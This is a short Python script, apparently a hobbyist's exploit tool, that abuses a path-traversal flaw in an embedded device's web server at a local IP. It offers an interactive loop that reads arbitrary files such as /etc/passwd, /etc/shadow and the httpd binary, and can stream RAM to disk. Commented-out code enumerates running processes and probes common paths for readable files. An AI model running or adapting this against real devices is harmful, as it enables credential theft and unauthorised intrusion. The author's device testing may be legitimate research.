import requests, socket, os
import traverse
import fetchy as ff

url = "10.0.0.127"

hh =ff
def do_cmd(host, stuff):
    result = None
    isCmd = stuff[:2]
    path = f"{traverse.TRAV_DEPTH}"
    match isCmd:
        case "q:":
            print("Breaking loop")
            return False, False
        case "b:":
            path += stuff[2:]
            print("binary dump - dump as binary to file")
            result = hh.fetch(host, path, bdumpAsBinary=True, output_file=os.path.basename(stuff[2:]))
        case "a:":
            print("ascii dump to file")
            path += stuff[2:]
            result = hh.fetch(host, path, output_file=os.path.basename(stuff[2:]))
        case "s:":
            print("Stream dump - streams large files to disk")
            path +=stuff[2:]
            result = hh.fetch(host, path, streamit=True, read_bytes=16000, max_read=98376000, output_file=os.path.basename(stuff[2:]))
        case _:
            path +=stuff # Better not have used any other prefix bud
            result = hh.fetch(host, path)
    return True, result

def parse_traverse(host):
    pathorcmd = input("[Path to dump?]>  ")
    Go, result = do_cmd(host, pathorcmd)
    return Go, result
# 98376000 bytes of total ram for the device I'm testing with.

Traversssssaaaahhh = """
= = = = = = = = Traverse = = = = = = = =
> q:                     -> Breaks loop, exits
> s:/path/to/big_file    ->    streams bytes to file, for dumping something like RAM.
>> If dumping ram, theres not exactly EOF,  you'll need to set bytes to read.
> b:/bin/httpd -         ->    dump to file as binary
> a:/etc/passwd          ->    dump as ascii or wtever
> /etc/passwd             ->    print dont save

Not professional parser, just do shit right.
= = = = = = = = End = = = = = = = =
"""
# in console, just I just popped the path I was interersted in
# at the time, say, /etc/shadow, and well thats it.
print(Traversssssaaaahhh)
Go = True
while Go:
    Go, result = parse_traverse(url)
    if result:
        print(result)


"""
import re
def piddump(noonkey_ip_addr):
    good_pids = {}
    
    for pid in range(0,1000):
        resp = fetch(noonkey_ip_addr, f"{traverse.TRAV_DEPTH}proc/{pid}/status")
    
        if resp and resp.startswith("HTTP/1.0 200 OK"):
            print(f"[+] Found process: {pid}")
            match = re.search(r'Name:\s*(\S+)', resp)
            name = match.group(1) if match else "Name not found"
            good_pids[pid]=name
    
    print("\n=== Paths returning 200 OK ===")
    return good_pids

"""

"""

good_paths = []

for path in traverse.common_paths:
    target = f"{traverse.TRAV_DEPTH}{path}"
    resp = fetch('10.0.0.127', target)

    if resp and resp.startswith("HTTP/1.0 200 OK"):
        print(f"[+] Got 200 @ {path}")
        good_paths.append(path)

print("\n=== Paths returning 200 OK ===")
print(good_paths)

"""

